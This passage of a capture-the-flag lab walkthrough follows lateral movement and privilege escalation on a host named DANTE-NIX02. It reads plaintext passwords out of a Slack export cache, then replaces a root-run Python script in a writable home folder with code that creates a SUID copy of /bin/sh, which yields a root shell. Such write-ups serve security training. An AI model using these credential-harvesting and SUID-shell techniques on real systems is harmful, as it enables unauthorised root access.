In frank Downloads folder we find a zip file with Slack content. Slack keeps cache of content, so keep digging for info and found a conversation with two passwords

```bash
margaret@DANTE-NIX02:~$ cat ~/.config/Slack/exported_data/secure/2020-05-18.json | grep '"text":'

"text": "<@U013CT40QHM> has joined the channel"
"text": "<@U013CT40QHM> set the channel purpose: discuss network security",
"text": "<@U014025GL3W> has joined the channel",
"text": "Hi Margaret, I created the channel so we can discuss the network security - in private!"
"text": "Great idea, Frank"
"text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"
"text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet"
"text": "Ahh sorry about that - its STARS5678FORTUNE401"
"text": "Thanks very much, I'll get on that now."
"text": "No problem at all. I'll make this channel private from now on - we cant risk another breach"
"text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"
"text": "Thanks, will do"
"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
```

With sudo we try frank password and we move laterally to frank successfully

Running pspy we found that user root is executing a python script located in frank home folder

```bash
-r--r--r-- 1 root root 198 May 19  2020 /home/frank/apache_restart.py
```

But we don't have enough permissions to modify but as we are in frank home folder we can rename the file and create another one with the same name and modify the code

```bash
frank@DANTE-NIX02:~$ mv apache_restart.py apache_restart-cp.py 
frank@DANTE-NIX02:~$ cp apache_restart-cp.py apache_restart.py
frank@DANTE-NIX02:~$ chmod +wx apache_restart.py
frank@DANTE-NIX02:~$ vim apache_restart.py
	import os
	os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
frank@DANTE-NIX02:~$ /tmp/sh -p
# whoami
root
